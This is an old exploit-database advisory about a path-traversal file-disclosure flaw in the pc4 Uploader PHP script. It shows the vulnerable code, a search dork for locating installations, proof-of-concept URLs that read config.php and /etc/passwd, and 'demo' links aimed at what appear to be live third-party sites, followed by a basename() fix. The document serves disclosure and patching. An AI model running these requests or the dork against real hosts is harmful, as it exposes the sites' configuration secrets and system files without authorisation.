@@ -1,0 +1,144 @@
+                                            ||          ||   | ||
+                                     o_,_7 _||  . _o_7 _|| q_|_||  o_\\\_,
+                                    (  :  /    (_)    /           (      .
+
+                                             ___________________
+                                           _/QQQQQQQQQQQQQQQQQQQ\__
+                                        __/QQQ/````````````````\QQQ\___
+                                      _/QQQQQ/                  \QQQQQQ\
+                                     /QQQQ/``                    ```QQQQ\
+                                    /QQQQ/ Advisory                 \QQQQ\
+                                   |QQQQ/    By      Qabandi         \QQQQ|
+                                   |QQQQ|                            |QQQQ|
+                                   |QQQQ|    From Kuwait, PEACE...   |QQQQ|
+                                   |QQQQ|                            |QQQQ|
+                                   |QQQQ\       iqa[a]hotmail.fr     /QQQQ|
+                                    \QQQQ\                      __  /QQQQ/
+                                     \QQQQ\                    /QQ\_QQQQ/
+                                      \QQQQ\                   \QQQQQQQ/
+                                       \QQQQQ\                 /QQQQQ/_
+                                        ``\QQQQQ\_____________/QQQ/\QQQQ\_
+                                           ``\QQQQQQQQQQQQQQQQQQQ/  `\QQQQ\
+                                              ```````````````````     `````
+
+=Vuln:		pc4arb - pc4 Uploader <= 10.0 Remote File Disclosure Vulnerability
+=INFO:		http://pc4arb.com/article-48.html
+=BUY:  		~~~
+=Download:      ~~~
+=DORK:		intext:"Pictures of Whale Penis"
+
+                                  ____________
+                              _-=/:Conditions:\=-_
+````````````````````````````````````````````````````````````````````````````````
+
+none
+
+---------------------------------------===--------------------------------------
+
+                                _________________
+                            _-=/:Vulnerable_Code:\=-_
+````````````````````````````````````````````````````````````````````````````````
+// in "./pc4uploader/upfiles/index.php"
+
+function displayimage( $fn, $lastMod, $fs )
+{
+    global $out_Types;
+    $ext = explode( ".", $fn );
+    $ext_i = count( $ext ) - 1;
+    $file_ext = $ext[$ext_i];
+    header( "Last-Modified: ".$lastMod );
+    header( "ETag: ".getetag( $fn ) );
+    header( "Accept-Ranges: bytes" );
+    header( "Content-Length: ".$fs );
+    header( "Content-Type: ".$out_Types[$file_ext] );
+    $fp = fopen( $fn, "rb" ); <-----------------------------//opens $fn with no filtering or precautions taken
+    if ( function_exists( fpassthru ) )
+    {
+        fpassthru( $fp );
+    }
+    else
+    {
+        $temp = fread( $fp, $fs );
+        echo $temp;
+    }
+    fclose( $fp );
+    return;
+}
+
+// Function displayimage() is later called
+
+$file = $_GET['file']; <---------------------------------// again, not filtered or anything.
+//..
+//..
+//..
+//..
+    displayimage( $file, "Thu, 01 Jan 2006 12:00:00 GMT", $fs );
+
+---------------------------------------===--------------------------------------
+
+                                     _______
+                                 _-=/:P.o.C:\=-_
+````````````````````````````````````````````````````````````````````````````````
+
+http://localhost/pc4uploader/upfiles/index.php?file=../config.php
+http://localhost/pc4uploader/upfiles/index.php?file=/etc/passwd
+
+demo:
+
+http://upload.traidnt.net/upfiles/index.php?file=../config.php
+{Save File to view the code if needed}
+
+http://uploader.pc4arb.com/upfiles/index.php?file=../config.php
+{view source}
+
+
+
+---------------------------------------===--------------------------------------
+
+                                    __________
+                                _-=/:SOLUTION:\=-_
+````````````````````````````````````````````````````````````````````````````````
+
+//Use this displayimage() function instead, notice the changes..
+
+function displayimage( $fn, $lastMod, $fs )
+{
+    global $out_Types;
+    $fn = basename($fn); 
+    $ext = explode( ".", $fn );
+    $ext_i = count( $ext ) - 1;
+    $file_ext = $ext[$ext_i];
+    header( "Last-Modified: ".$lastMod );
+    header( "ETag: ".getetag( $fn ) );
+    header( "Accept-Ranges: bytes" );
+    header( "Content-Length: ".$fs );
+    header( "Content-Type: ".$out_Types[$file_ext] );
+    $fp = fopen( $fn, "rb" );
+    if ( function_exists( fpassthru ) )
+    {
+        fpassthru( $fp );
+    }
+    else
+    {
+        $temp = fread( $fp, $fs );
+        echo $temp;
+    }
+    fclose( $fp );
+    return;
+}
+
+//I added    $fn = basename($fn);, it will convert anything like "../../config.php" to "config.php"
+// since config.php doesent exist the script will do the rest by giving a safe error,
+// also move ./include/default.gif to ./upfiles/default.gif
+// everything should be good :)
+
+---------------------------------------===--------------------------------------
+ ______________________________________________________________________________
+/                                                                              \
+|         Tem al-tableegh 3an el-thaghra min sinat yaddi 	               |
+\______________________________________________________________________________/
+                                \ No More Private /
+                                 `````````````````
+                           Salamz to All Muslim Hackers.
+
+# milw0rm.com [2009-06-22]
